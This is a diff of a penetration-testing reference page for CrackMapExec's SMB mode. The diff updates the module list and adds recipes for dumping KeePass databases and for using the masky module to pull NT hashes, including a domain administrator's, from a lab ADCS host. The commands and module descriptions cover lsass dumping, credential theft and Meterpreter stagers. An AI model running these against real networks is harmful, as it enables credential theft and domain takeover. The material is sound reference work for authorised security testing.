@@ -11,11 +11,11 @@ tags : ['Framework', 'SMB']
 
 ## CrackMapExec - SMB
 
-### Installation
+## Installation
 
 Install the [CrackMapExec]({{< ref "../" >}})
 
-### Usage
+## Usage
 
 ```plain
 cme smb [-h] [-id CRED_ID [CRED_ID ...]] [-u USERNAME [USERNAME ...]] [-p PASSWORD [PASSWORD ...]] [-k] [--export EXPORT [EXPORT ...]] [--aesKey AESKEY [AESKEY ...]] [--kdcHost KDCHOST]
@@ -29,7 +29,7 @@ cme smb [-h] [-id CRED_ID [CRED_ID ...]] [-u USERNAME [USERNAME ...]] [-p PASSWO
                [target ...]
 ```
 
-### Flags
+## Flags
 
 ```plain
 positional arguments:
@@ -154,48 +154,39 @@ Powershell Obfuscation:
 The modules below can be used with the `-M` option.
 
 ```plain
-[*] Get-ComputerDetails       Enumerates sysinfo
 [*] bh_owned                  Set pwned computer as owned in Bloodhound
-[*] bloodhound                Executes the BloodHound recon script on the target and retreives the results to the attackers' machine
+[*] dfscoerce                 Module to check if the DC is vulnerable to DFSCocerc, credit to @filip_dragovic/@Wh04m1001 and @topotam
 [*] drop-sc                   Drop a searchConnector-ms file on each writable share
 [*] empire_exec               Uses Empire's RESTful API to generate a launcher for the specified listener and executes it
 [*] enum_avproducts           Gathers information on all endpoint protection solutions installed on the the remote host(s) via WMI
-[*] enum_chrome               Decrypts saved Chrome passwords using Get-ChromeDump
 [*] enum_dns                  Uses WMI to dump DNS from an AD DNS Server
-[*] get_keystrokes            Logs keys pressed, time and the active window
-[*] get_netdomaincontroller   Enumerates all domain controllers
-[*] get_netrdpsession         Enumerates all active RDP sessions
-[*] get_timedscreenshot       Takes screenshots at a regular interval
+[*] get_netconnections        Uses WMI to query network connections.
 [*] gpp_autologin             Searches the domain controller for registry.xml to find autologon information and returns the username and password.
 [*] gpp_password              Retrieves the plaintext password and other information for accounts pushed through Group Policy Preferences.
 [*] handlekatz                Get lsass dump using handlekatz64 and parse the result with pypykatz
-[*] invoke_sessiongopher      Digs up saved session information for PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP using SessionGopher
-[*] invoke_vnc                Injects a VNC client in memory
+[*] hash_spider               Dump lsass recursively from a given hash using BH to find local admins
+[*] install_elevated          Checks for AlwaysInstallElevated
 [*] ioxidresolver             Thie module helps you to identify hosts that have additional active interfaces
+[*] keepass_discover          Search for KeePass-related files and process.
+[*] keepass_trigger           Set up a malicious KeePass trigger to export the database in cleartext.
 [*] lsassy                    Dump lsass and parse the result remotely with lsassy
+[*] masky                     Remotely dump domain user credentials via an ADCS and a KDC
 [*] met_inject                Downloads the Meterpreter stager and injects it into memory
-[*] mimikatz                  Dumps all logon credentials from memory
-[*] mimikatz_enum_chrome      Decrypts saved Chrome passwords using Mimikatz
-[*] mimikatz_enum_vault_creds Decrypts saved credentials in Windows Vault/Credential Manager
-[*] mimikittenz               Executes Mimikittenz
 [*] ms17-010                  MS17-010, /!\ not tested oustide home lab
-[*] multirdp                  Patches terminal services in memory to allow multiple RDP users
 [*] nanodump                  Get lsass dump using nanodump and parse the result with pypykatz
-[*] netripper                 Capture's credentials by using API hooking
 [*] nopac                     Check if the DC is vulnerable to CVE-2021-42278 and CVE-2021-42287 to impersonate DA from standard domain user
-[*] pe_inject                 Downloads the specified DLL/EXE and injects it into memory
+[*] ntlmv1                    Detect if lmcompatibilitylevel on the target is set to 0 or 1
 [*] petitpotam                Module to check if the DC is vulnerable to PetitPotam, credit to @topotam
 [*] procdump                  Get lsass dump using procdump64 and parse the result with pypykatz
 [*] rdp                       Enables/Disables RDP
-[*] rid_hijack                Executes the RID hijacking persistence hook.
 [*] runasppl                  Check if the registry value RunAsPPL is set or not
 [*] scuffy                    Creates and dumps an arbitrary .scf file with the icon property containing a UNC path to the declared SMB server against all writeable shares
-[*] shellcode_inject          Downloads the specified raw shellcode and injects it into memory
+[*] shadowcoerce              Module to check if the target is vulnerable to ShadowCoerce, credit to @Shutdown and @topotam
 [*] slinky                    Creates windows shortcuts with the icon attribute containing a UNC path to the specified SMB server in all shares with write permissions
 [*] spider_plus               List files on the target server (excluding `DIR` directories and `EXT` extensions) and save them to the `OUTPUT` directory if they are smaller then `SIZE`
 [*] spooler                   Detect if print spooler is enabled or not
+[*] teams_localdb             Retrieves the cleartext ssoauthcookie from the local Microsoft Teams database, if teams is open we kill all Teams process
 [*] test_connection           Pings a host
-[*] tokens                    Enumerates available tokens
 [*] uac                       Checks UAC status
 [*] wdigest                   Creates/Deletes the 'UseLogonCredential' registry key enabling WDigest cred dumping on Windows >= 8.1
 [*] web_delivery              Kicks off a Metasploit Payload using the exploit/multi/script/web_delivery module
@@ -214,7 +205,7 @@ For local authentication, add the `--local-auth` flag to the command.
 cme smb <target> -u <user> -p <password> --ntds
 ```
 
-#### Dump NTDS history
+### Dump NTDS history
 
 ```plain
 cme smb <target> -u <user> -p <password> --ntds-history
@@ -257,6 +248,16 @@ Other modules that can be used.
 
 ```plain
 cme smb <target> -u <user> -p <password> -M lsassy -o DUMP_METHOD=2 PROCDUMP_PATH=/sysinternals/procdump.exe
+```
+
+### Dump KeePass
+
+```plain
+cme smb <target> -u <user-or-admin> -p <password> -M keepass_discover
+```
+
+```plain
+cme smb <target> -u <user-or-admin> -p <password> -M keepass_trigger -o KEEPASS_CONFIG_PATH="C:\Users\crypt0rr\AppData\Roaming\KeePass\KeePass.config.xml" ACTION=ALL
 ```
 
 ### Check Password Policy
@@ -459,6 +460,20 @@ SLINKY      10.10.10.15   445    SRV_FS         [+] Found writable share: exampl
 SLINKY      10.10.10.15   445    SRV_FS         [+] Deleted LNK file on the example share
 ```
 
-### URL list
+### Exploit ADCS to retrieve NTLM hashes for all connected users (masky)
+
+```plain
+$ cme smb 10.10.10.8 -u john-adm -p Welkom1234! -M masky -0 CA='ADCS01.offsec.nl\offsec-ADCS01-CA"
+SMB     10.10.10.8  445     ADCS01          [*] Windows 10.0 Build 20348 x64 (name: ADCS01) (domain: offsec.nl) (signing: False) (SMBv1: False)
+SMB     10.10.10.8  445     ADCS01          [+] offsec.nl\john-adm: Welkom1234! (Pwn3d! )
+MASKY   10.10.10.8  445     ADCS01          [*] Running Masky on the targeted host
+MASKY   10.10.10.8  445     ADCS01          [*] 2 session(s) successfully hijacked
+MASKY   10.10.10.8  445     ADCS01          [*] Attempting to retrieve NT hash(es) via PKINIT
+MASKY   10.10.10.8  445     ADCS01          offsec\john-adm 97f2592347d8fbe42be381726ff9ea83
+MASKY   10.10.10.8  445     ADCS01          offsec\administrator 97f2592347d8fbe42be381726ff9ea83
+MASKY   10.10.10.8  445     ADCS01          [+] 2 NT hash(es) successfully collected
+```
+
+## URL List
 
 * [Github.com - CrackMapExec](https://github.com/Porchetta-Industries/CrackMapExec)
